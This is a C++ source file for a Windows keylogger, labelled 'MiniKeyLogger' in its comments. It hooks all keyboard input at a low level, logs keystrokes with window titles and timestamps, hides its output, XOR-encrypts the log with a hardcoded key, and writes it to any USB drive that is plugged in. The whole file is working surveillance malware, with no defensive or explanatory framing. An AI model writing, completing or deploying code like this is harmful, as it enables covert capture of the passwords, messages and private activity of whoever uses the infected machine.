
#include <Windows.h>
#include "time.h"
#include "string"
#include <sstream>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <dbt.h>
#include <initguid.h>
#include <bitset>
#include <thread> // For std::this_thread::sleep_for



// SHIFT key
bool shift = FALSE;

// Window management
char cWindow[1000];
HWND lastWindow = NULL;

// Log buffer
std::ostringstream logBuffer;
std::string key = "mysecretkey";

// Drive
std::bitset<32> initialDrives;

std::bitset<32> getCurrentLogicalDrives() {
	DWORD drives = GetLogicalDrives();
	return std::bitset<32>(drives);
}

// Function to find the new drive added
std::string findNewDrive(const std::bitset<32>& oldDrives, const std::bitset<32>& newDrives) {
	for (int i = 0; i < 32; ++i) {
		if (newDrives.test(i) && !oldDrives.test(i)) {
			char driveLetter = 'A' + i;
			return std::string(1, driveLetter) + ":\\";
		}
	}
	return "";
}

void printLogicalDrives(const std::bitset<32>& drives) {
	// std::cout << "Current logical drives: ";
	for (int i = 0; i < 32; ++i) {
		if (drives.test(i)) {
			char driveLetter = 'A' + i;
			// std::cout << driveLetter << ":\\ ";
		}
	}
	// std::cout << std::endl;
}


std::string GetKeyCode(DWORD code, BOOL caps, BOOL shift)
{
	//LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	std::string key;
	switch (code)
	{
	case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
	case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
	case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
	case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
	case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
	case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
	case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
	case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
	case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
	case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
	case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
	case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
	case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
	case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
	case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
	case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
	case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
	case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
	case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
	case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
	case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
	case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
	case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
	case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
	case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
	case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		// Sleep Key
	case VK_SLEEP: key = "[SLEEP]"; break;
		// Num Keyboard 
	case VK_NUMPAD0:  key = "0"; break;
	case VK_NUMPAD1:  key = "1"; break;
	case VK_NUMPAD2:  key = "2"; break;
	case VK_NUMPAD3:  key = "3"; break;
	case VK_NUMPAD4:  key = "4"; break;
	case VK_NUMPAD5:  key = "5"; break;
	case VK_NUMPAD6:  key = "6"; break;
	case VK_NUMPAD7:  key = "7"; break;
	case VK_NUMPAD8:  key = "8"; break;
	case VK_NUMPAD9:  key = "9"; break;
	case VK_MULTIPLY: key = "*"; break;
	case VK_ADD:      key = "+"; break;
	case VK_SEPARATOR: key = "-"; break;
	case VK_SUBTRACT: key = "-"; break;
	case VK_DECIMAL:  key = "."; break;
	case VK_DIVIDE:   key = "/"; break;
		// Function Keys
	case VK_F1:  key = "[F1]"; break;
	case VK_F2:  key = "[F2]"; break;
	case VK_F3:  key = "[F3]"; break;
	case VK_F4:  key = "[F4]"; break;
	case VK_F5:  key = "[F5]"; break;
	case VK_F6:  key = "[F6]"; break;
	case VK_F7:  key = "[F7]"; break;
	case VK_F8:  key = "[F8]"; break;
	case VK_F9:  key = "[F9]"; break;
	case VK_F10:  key = "[F10]"; break;
	case VK_F11:  key = "[F11]"; break;
	case VK_F12:  key = "[F12]"; break;
	case VK_F13:  key = "[F13]"; break;
	case VK_F14:  key = "[F14]"; break;
	case VK_F15:  key = "[F15]"; break;
	case VK_F16:  key = "[F16]"; break;
	case VK_F17:  key = "[F17]"; break;
	case VK_F18:  key = "[F18]"; break;
	case VK_F19:  key = "[F19]"; break;
	case VK_F20:  key = "[F20]"; break;
	case VK_F21:  key = "[F22]"; break;
	case VK_F22:  key = "[F23]"; break;
	case VK_F23:  key = "[F24]"; break;
	case VK_F24:  key = "[F25]"; break;
		// Keys
	case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
	case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
	case VK_BACK:    key = "[BACK]"; break;
	case VK_TAB:     key = "[TAB]"; break;
	case VK_CLEAR:   key = "[CLEAR]"; break;
	case VK_RETURN:  key = "[ENTER]"; break;
	case VK_SHIFT:   key = "[SHIFT]"; break;
	case VK_CONTROL: key = "[CTRL]"; break;
	case VK_MENU:    key = "[ALT]"; break;
	case VK_PAUSE:   key = "[PAUSE]"; break;
	case VK_CAPITAL: key = "[CAP-LOCK]"; break;
	case VK_ESCAPE:  key = "[ESC]"; break;
	case VK_SPACE:   key = "[SPACE]"; break;
	case VK_PRIOR:   key = "[PAGEUP]"; break;
	case VK_NEXT:    key = "[PAGEDOWN]"; break;
	case VK_END:     key = "[END]"; break;
	case VK_HOME:    key = "[HOME]"; break;
	case VK_LEFT:    key = "[LEFT]"; break;
	case VK_UP:      key = "[UP]"; break;
	case VK_RIGHT:   key = "[RIGHT]"; break;
	case VK_DOWN:    key = "[DOWN]"; break;
	case VK_SELECT:  key = "[SELECT]"; break;
	case VK_PRINT:   key = "[PRINT]"; break;
	case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
	case VK_INSERT:  key = "[INS]"; break;
	case VK_DELETE:  key = "[DEL]"; break;
	case VK_HELP:    key = "[HELP]"; break;
		// Number Keys with shift
	case 0x31:  key = shift ? "!" : "1"; break;
	case 0x32:  key = shift ? "@" : "2"; break;
	case 0x33:  key = shift ? "#" : "3"; break;
	case 0x34:  key = shift ? "$" : "4"; break;
	case 0x35:  key = shift ? "%" : "5"; break;
	case 0x36:  key = shift ? "^" : "6"; break;
	case 0x37:  key = shift ? "&" : "7"; break;
	case 0x38:  key = shift ? "*" : "8"; break;
	case 0x39:  key = shift ? "(" : "9"; break;
	case 0x30:  key = shift ? ")" : "0"; break;
		// Windows Keys
	case VK_LWIN:     key = "[WIN]"; break;
	case VK_RWIN:     key = "[WIN]"; break;
	case VK_LSHIFT:   key = "[SHIFT]"; break;
	case VK_RSHIFT:   key = "[SHIFT]"; break;
	case VK_LCONTROL: key = "[CTRL]"; break;
	case VK_RCONTROL: key = "[CTRL]"; break;
		// OEM Keys with shift 
	case VK_OEM_1:      key = shift ? ":" : ";"; break;
	case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
	case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
	case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
	case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
	case VK_OEM_2:      key = shift ? "?" : "/"; break;
	case VK_OEM_3:      key = shift ? "~" : "`"; break;
	case VK_OEM_4:      key = shift ? "{" : "["; break;
	case VK_OEM_5:      key = shift ? "\\" : "|"; break;
	case VK_OEM_6:      key = shift ? "}" : "]"; break;
	case VK_OEM_7:      key = shift ? "\"" : "'"; break;
		// Action Keys
	case VK_PLAY:       key = "[PLAY]";
	case VK_ZOOM:       key = "[ZOOM]";
	case VK_OEM_CLEAR:  key = "[CLEAR]";
	case VK_CANCEL:     key = "[CTRL-C]";

	default: key = "[UNK-KEY]"; break;
	}
	return key;

}

void CaptureTime() {
	// Get the current time
	SYSTEMTIME t;
	GetSystemTime(&t);

	int day = t.wDay;
	int month = t.wMonth;
	int year = t.wYear;
	int hour = t.wHour;
	int min = t.wMinute;
	int sec = t.wSecond;
	int dayName = t.wDayOfWeek;
	int ms = t.wMilliseconds;

	// Build time header using std::setw and std::setfill to format the output
	logBuffer << day << "/" << month << "/" << year << " ";
	logBuffer << hour << ":" << std::setfill('0') << std::setw(2) << min << ":";
	logBuffer << std::setfill('0') << std::setw(2) << sec << ".";
	logBuffer << std::setfill('0') << std::setw(3) << ms;
}


LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{

	bool caps = FALSE;

	// Caps-lock management
	SHORT capsShort = GetKeyState(VK_CAPITAL);
	if (capsShort > 0)
	{
		caps = TRUE;
	}

	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

	if (nCode == HC_ACTION)
	{
		// Shift management
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT || p->vkCode == VK_SHIFT)
		{
			// WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
			if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
			{
				shift = TRUE;
			}
			if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
			{
				shift = FALSE;
			}
		}

		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			// Retrieves a handle to the foreground window (the window with which the user is currently working).
			HWND currentWindow = GetForegroundWindow();
			// Check if we need to write new window output
			if (currentWindow != lastWindow)
			{
				logBuffer << "\n[+] ";
				// Capture time
				CaptureTime();

				// Get the current window text
				int c = GetWindowTextA(currentWindow, cWindow, sizeof(cWindow));
				logBuffer << c;
				logBuffer << " - Current Window: " << cWindow << "\n";

				// Setup for next CallBack currentWindow
				lastWindow = currentWindow;
			}
			// Now capture keys
			if (p->vkCode)
			{
				CaptureTime();
				logBuffer << " " << GetKeyCode(p->vkCode, caps, shift) << "\n";
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Simple encryption to obfuscate the keylog file - Use AES or similar for real-world use
std::string xorEncryptDecrypt(const std::string& input, const std::string& key) {
	std::string output = input;

	for (size_t i = 0; i < input.size(); ++i) {
		output[i] = input[i] ^ key[i % key.length()];
	}

	return output;
}

void processLog(const std::string& usbDrivePath) {
	// Get the content from the buffer
	std::string logContent = logBuffer.str();

	// Encrypt the content
	std::string encryptedContent = xorEncryptDecrypt(logContent, key);

	// Prepare to create a temporary file
	//char tempPath[MAX_PATH];
	//char tempFileName[MAX_PATH];
	//// Get the temp path
	//GetTempPath(MAX_PATH, tempPath);
	//// Create a temporary file name
	//GetTempFileName(tempPath, "LOG", 0, tempFileName);

	char tempFileName[MAX_PATH];
	GetTempFileName(usbDrivePath.c_str(), "LOG", 0, tempFileName);

	// Write encrypted content to the file
	std::ofstream outFile(tempFileName, std::ios::out | std::ios::binary);
	if (outFile.is_open()) {
		outFile << encryptedContent;
		outFile.close();
		// std::cout << "Encrypted log written to: " << tempFileName << std::endl;
	}
	else {
		// std::cout << "Failed to open file for writing." << std::endl;
	}

	// Optionally clear the buffer after writing
	logBuffer.str("");
	logBuffer.clear();
}

//void CALLBACK TimerProc(HWND hWnd, UINT message, UINT iTimerID, DWORD dwTime) {
//    processLog();  // Call the log processing function
//}

// Define GUID for USB devices
DEFINE_GUID(GUID_DEVINTERFACE_USB_DEVICE, 0xA5DCBF10L, 0x6530, 0x11D2, 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg == WM_DEVICECHANGE) {
		if (wParam == DBT_DEVICEARRIVAL) {
			PDEV_BROADCAST_HDR hdr = (PDEV_BROADCAST_HDR)lParam;
			if (hdr->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
				PDEV_BROADCAST_DEVICEINTERFACE pInterface = (PDEV_BROADCAST_DEVICEINTERFACE)lParam;
				if (IsEqualGUID(pInterface->dbcc_classguid, GUID_DEVINTERFACE_USB_DEVICE)) {
					// std::cout << "USB device inserted!" << std::endl;
					std::this_thread::sleep_for(std::chrono::seconds(1)); // Delay for 1 second

					auto newDrives = getCurrentLogicalDrives();
					std::string newDrive = findNewDrive(initialDrives, newDrives);
					printLogicalDrives(newDrives);
					if (!newDrive.empty()) {
						// std::cout << "New USB device inserted! Drive path: " << newDrive << std::endl;
						processLog(newDrive);  // Call the log processing function
					}
				}
			}
		}
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

HWND SetupWindow(const char* className) {
	WNDCLASSEX wx = {};
	wx.cbSize = sizeof(WNDCLASSEX);
	wx.lpfnWndProc = WindowProc;        // function which will handle messages
	wx.hInstance = GetModuleHandle(NULL);
	wx.lpszClassName = className;

	if (RegisterClassEx(&wx) == 0) {
		std::cerr << "Window registration failed!" << std::endl;
		return NULL;
	}

	HWND hwnd = CreateWindowEx(
		0, className, "Device Notification Window", 0,
		0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL
	);

	if (hwnd == NULL) {
		std::cerr << "Window creation failed!" << std::endl;
	}
	return hwnd;
}

HDEVNOTIFY RegisterDeviceNotificationForUSB(HWND hwnd) {
	DEV_BROADCAST_DEVICEINTERFACE notificationFilter = {};
	notificationFilter.dbcc_size = sizeof(notificationFilter);
	notificationFilter.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
	notificationFilter.dbcc_classguid = GUID_DEVINTERFACE_USB_DEVICE;

	HDEVNOTIFY hDeviceNotify = RegisterDeviceNotification(
		hwnd, &notificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE
	);

	if (hDeviceNotify == NULL) {
		std::cerr << "Device notification registration failed!" << std::endl;
	}
	return hDeviceNotify;
}





int main()
{
	// USB setup
	const char* className = "HiddenWindowClass";
	HWND hwnd = SetupWindow(className);
	if (hwnd == NULL) return 1;

	HDEVNOTIFY hDeviceNotify = RegisterDeviceNotificationForUSB(hwnd);
	if (hDeviceNotify == NULL) return 1;

	initialDrives = getCurrentLogicalDrives();  // Get initial drives at the start
	printLogicalDrives(initialDrives);

	// timer setup
	//MSG msg;
	//UINT_PTR timerId = SetTimer(NULL, 0, 30000, (TIMERPROC)TimerProc);  // Set timer for 60000 ms (1 minute)

	//if (timerId == 0) {
	//	std::cerr << "Failed to create timer" << std::endl;
	//	return 1;
	//}

	//// std::cout << "Timer started, logging every 30 sec." << std::endl;
	// ----------
	
	//KeyLogger setup
	// std::cout << "[*] Starting MiniKeyLogger..." << std::endl;

	HHOOK KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // low-level keyboard input events
		HookProcedure, // pointer to the hook procedure
		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
		NULL //desktop apps, if this parameter is zero
	);

	if (!KeyboardHook) {
		// std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
	}
	else {
		// Message loop
		// std::cout << "[*] MiniKeyLogger started keyboard capture!" << std::endl;
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}

	// Cleanup
	if (KeyboardHook)
	{
		UnhookWindowsHookEx(KeyboardHook);
	}
	UnregisterDeviceNotification(hDeviceNotify);

	return 0;
}
